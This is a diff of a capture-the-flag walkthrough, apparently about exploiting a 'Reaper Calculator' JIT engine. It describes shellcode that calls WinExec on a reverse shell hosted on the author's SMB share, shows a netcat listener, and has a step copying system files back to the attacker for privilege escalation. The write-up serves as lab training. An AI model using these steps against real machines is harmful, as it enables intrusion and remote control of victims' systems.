@@ -179,10 +179,10 @@ resolve_winexec:
     jmp 0x1c                        ; this is to defeat the JIT restrictions
 ```
 
-- Pushes a string on the stack. This is an SMB share on my kali host, with a reverse shell executable.
+- Pushes a string on the stack. This is an SMB share on my Kali host, with a reverse shell executable.
 - Calls `WinExec` using 64-bit calling conventions.
 
-I set up a **SMB** share on my kali host. I hosted a reverse shell and executed my final JavaScript exploit in the Reaper Calculator:
+I set up a **SMB** share on my Kali host. I hosted a reverse shell and executed my final JavaScript exploit in the Reaper Calculator:
 
 ```
 nc -nvlp 4443
@@ -196,7 +196,7 @@ C:\Windows\system32>
 
 ### Enumeration
 
-
+Now we are on the device we should take a copy of the custom driver `Reaper2.sys` and `C:\Windows\System32\ntoskrnl.exe`. These can be copied to our **SMB** share on our Kali host.
 
 ## Privilege Escalation
 
